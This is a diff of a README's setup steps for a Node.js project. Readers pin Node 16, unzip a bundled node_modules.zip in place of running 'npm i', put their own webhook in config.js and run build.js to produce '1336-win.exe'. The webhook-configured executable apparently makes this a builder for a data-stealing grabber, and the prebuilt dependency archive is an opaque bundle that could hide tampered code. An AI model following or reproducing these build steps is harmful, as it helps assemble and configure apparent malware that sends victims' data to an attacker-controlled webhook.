@@ -24,7 +24,7 @@
 
 ### 📁  〢 Setting Up
 
-> Install [Node.js](https://nodejs.org/en/download/) 
+> Install [Node 16](https://nodejs.org/en/blog/release/v16.16.0/) 
 > 
 > IMPORTANT: When installing Node.js also install "Tools for Native Modules" => Tick `Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.`
 > 
@@ -32,11 +32,11 @@
 >
 > Install [Visual studio](https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSFeaturesPage&passive=true&tailored=cplus&cid=2031#cplusplus) with C++ compilers and all enabled (is a bit gigs but u wont have errors)
 > 
-> Run **_npm i_** in cmd path
+> Unzip **node_modules.zip** archive in same path
 >
 > Place your webhook in **_config.js_**
 >
-> Run **_node build.js_** in cmd and wait for **_1336-win.exe_** to be built.
+> Run **_node build.js_** in cmd path and wait for **_1336-win.exe_** to be built.
 >
 > Note: Changing the icon does not work and will corrupt the exe
 
